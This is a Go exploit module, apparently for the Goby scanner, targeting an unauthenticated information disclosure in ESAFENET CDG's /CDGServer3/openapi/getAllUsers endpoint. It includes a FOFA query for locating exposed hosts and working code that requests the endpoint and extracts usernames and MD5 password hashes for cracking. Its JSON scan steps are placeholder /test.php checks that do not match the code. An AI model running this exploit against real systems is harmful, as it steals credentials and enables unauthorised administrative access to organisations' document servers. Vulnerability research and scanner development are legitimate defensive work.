package exploits

import (
	"errors"
	"regexp"
	"strings"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /getAllUsers Information Disclosure Vulnerability",
    "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.  </p><p>There is an information leakage vulnerability in the interface of the electronic document security management system /CDGServer3/openapi/getAllUsers, which can be exploited by an unauthenticated remote attacker to obtain sensitive information such as background account passwords, and then login to the background by further MD5 decryption, so that the system is in an extremely insecure state.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-08-20",
    "PostTime": "2024-08-20",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": " title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "GobyQuery": " title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "Level": "1",
    "Impact": "<p>There is an information leakage vulnerability in the interface of the electronic document security management system /CDGServer3/openapi/getAllUsers, which can be exploited by an unauthenticated remote attacker to obtain sensitive information such as background account passwords, and then login to the background by further MD5 decryption, so that the system is in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/141284624"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "getAllUsers",
            "show": ""
        },
        {
            "name": "page",
            "type": "input",
            "value": "1",
            "show": "mode=getAllUsers"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /getAllUsers 信息泄露漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，实现电子文档的数据安全。&nbsp;<br></p><p>亿赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /getAllUsers Information Disclosure Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.&nbsp;&nbsp;</p><p>There is an information leakage vulnerability in the interface of the electronic document security management system /CDGServer3/openapi/getAllUsers, which can be exploited by an unauthenticated remote attacker to obtain sensitive information such as background account passwords, and then login to the background by further MD5 decryption, so that the system is in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an information leakage vulnerability in the interface of the electronic document security management system /CDGServer3/openapi/getAllUsers, which can be exploited by an unauthenticated remote attacker to obtain sensitive information such as background account passwords, and then login to the background by further MD5 decryption, so that the system is in an extremely insecure state.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9939"
}`
	postOrGet_asnkjansbashbcbabdasbdsxziuas := func(hostInfo *httpclient.FixUrl, fileUrl string, page string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewPostRequestConfig("/CDGServer3/openapi/getAllUsers")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Data = "pageSize=100&pageNumber=" + page
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "code") {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/CDGServer3/openapi/getAllUsers"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"getAllUsers": "data\":",
			}
			// 函数继承
			uploadFileFunc := postOrGet_asnkjansbashbcbabdasbdsxziuas

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl, "1")
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"getAllUsers": {"getAllUsers", "data\":"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_asnkjansbashbcbabdasbdsxziuas
			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if _, ok := defaultModeMap[mode]; ok {
				fileUrl = defaultModeMap[mode][0]
				fileText = defaultModeMap[mode][1]
			} else {
				expResult.Success = false
				return expResult
			}
			// 获取返回结果url和返回请求头
			page := goutils.B2S(ss.Params["page"])
			if page != "" {
				resp, err := uploadFileFunc(expResult.HostInfo, fileUrl, page)
				if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				re, _ := regexp.Compile(`data":"((.|\n)*?)","`)
				if !re.MatchString(resp) {
					expResult.Success = false
					expResult.Output += "false"
					return expResult
				}
				match := re.FindStringSubmatch(resp)
				Result := match[1]

				if strings.Contains(Result, "password") {
					re, err = regexp.Compile(`\\"username\\":\\"((.|\n)*?)\\"`)
					if !re.MatchString(Result) {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					matches := re.FindAllStringSubmatch(Result, -1)
					var userNames []string
					for _, match := range matches {
						if len(match) > 1 {
							userNames = append(userNames, match[1])
						}
					}

					re, err = regexp.Compile(`\\"password\\":\\"((.|\n)*?)\\"`)
					// //检查是否有匹配到内容
					if !re.MatchString(Result) {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					matches = re.FindAllStringSubmatch(Result, -1)
					var userPwdmd5s []string
					for _, match := range matches {
						if len(match) > 1 {
							userPwdmd5s = append(userPwdmd5s, match[1])
						}
					}
          for i := 0; i < len(userNames); i++ {
            expResult.Output += "username: "+userNames[i] + "\r\npassword: " + userPwdmd5s[i] + "\r\n\r\n"
          }
          return expResult
				}
				expResult.Output = Result
				return expResult
			}
			expResult.Success = false
			expResult.Output = "Please enter page"
			return expResult
		},
	))
}
